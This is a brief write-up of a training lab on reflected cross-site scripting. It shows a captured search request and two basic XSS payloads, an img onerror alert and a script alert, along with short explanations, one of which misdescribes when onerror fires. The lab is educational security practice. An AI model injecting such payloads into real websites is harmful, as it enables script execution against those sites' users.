# Lab 1: Reflected XSS into HTML context with nothing encoded

### In the below request searched a random alphanumeric string which stores in a parameter name with the value . We have to do HTML injection to enable reflected XSS.

**Request**
```http
GET /?search=hello123 HTTP/2
Host: 0a8400c804542ae9821147ee0025001f.web-security-academy.net
Cookie: session=REDACTED
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a8400c804542ae9821147ee0025001f.web-security-academy.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```
### So we have to insert a html tag with our injected value , in search bar we can enter `<img src=x onerror=alert(1)>` or `<script>alert(1)</script>` which will produce an alert on the page displaying 1 .
- In `<img src=x onerror=alert(1)>` it'll create a blank image , and onerror will run whether it fails or create the iamge .
- Next `<script>alert(1)</script>` is a JS or HTML tag where we can insert anything to create it .
